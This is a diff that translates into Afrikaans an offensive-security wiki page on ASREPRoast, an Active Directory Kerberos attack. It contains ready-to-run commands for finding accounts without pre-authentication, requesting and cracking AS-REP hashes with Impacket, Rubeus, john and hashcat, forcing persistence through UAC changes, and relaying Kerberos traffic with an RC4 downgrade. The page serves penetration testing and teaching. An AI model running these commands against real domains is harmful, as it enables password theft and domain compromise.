@@ -4,31 +4,30 @@
 
 <figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hacking Inligting**\
+Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Regstyds Hack Nuus**\
+Bly op hoogte van die vinnig bewegende hacking wêreld deur regstydse nuus en insigte
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Laaste Aankondigings**\
+Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
 
 ## ASREPRoast
 
-ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.
+ASREPRoast is 'n sekuriteitsaanval wat gebruikers teiken wat die **Kerberos voor-sertifisering vereiste attribuut** ontbreek. Essensieel laat hierdie kwesbaarheid aanvallers toe om sertifisering vir 'n gebruiker van die Domeinbeheerder (DC) aan te vra sonder om die gebruiker se wagwoord te benodig. Die DC antwoord dan met 'n boodskap wat versleuteld is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers kan probeer om offline te kraak om die gebruiker se wagwoord te ontdek.
 
-The main requirements for this attack are:
+Die hoofvereistes vir hierdie aanval is:
 
-- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
-- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
-- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.
+- **Ontbreking van Kerberos voor-sertifisering**: Teiken gebruikers moet nie hierdie sekuriteitskenmerk geaktiveer hê nie.
+- **Verbinding met die Domeinbeheerder (DC)**: Aanvallers het toegang tot die DC nodig om versoeke te stuur en versleutelde boodskappe te ontvang.
+- **Opsionele domeinrekening**: Om 'n domeinrekening te hê, stel aanvallers in staat om kwesbare gebruikers meer doeltreffend te identifiseer deur LDAP-navrae. Sonder so 'n rekening moet aanvallers gebruikersname raai.
 
 #### Enumerating vulnerable users (need domain credentials)
-
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -36,9 +35,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-
-#### Request AS_REP message
-
+#### Versoek AS_REP boodskap
 ```bash:Using Linux
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -50,21 +47,17 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
-
 > [!WARNING]
-> AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+> AS-REP Roasting met Rubeus sal 'n 4768 genereer met 'n versleutelingstipe van 0x17 en 'n preauth-tipe van 0.
 
-### Cracking
-
+### Kraking
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
+### Volharding
 
-### Persistence
-
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
+Force **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll** toestemmings het (of toestemmings om eienskappe te skryf):
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -72,12 +65,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
+## ASREProast sonder geloofsbriewe
 
-## ASREProast without credentials
-
-An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
-
+'n Aanvaller kan 'n man-in-the-middle posisie gebruik om AS-REP pakkette te vang terwyl hulle die netwerk oorsteek sonder om op Kerberos voor-authentisering staat te maak om gedeaktiveer te wees. Dit werk dus vir alle gebruikers op die VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) stel ons in staat om dit te doen. Boonop dwing die hulpmiddel kliënt werkstasies om RC4 te gebruik deur die Kerberos onderhandeling te verander.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -88,8 +79,7 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-
-## References
+## Verwysings
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
@@ -97,18 +87,17 @@ ASRepCatcher listen
 
 <figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hacking Inligting**\
+Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Regte-Tyd Hack Nuus**\
+Bly op hoogte van die vinnig bewegende hacking wêreld deur middel van regte-tyd nuus en insigte
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Laaste Aankondigings**\
+Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!
 
 {{#include ../../banners/hacktricks-training.md}}
-
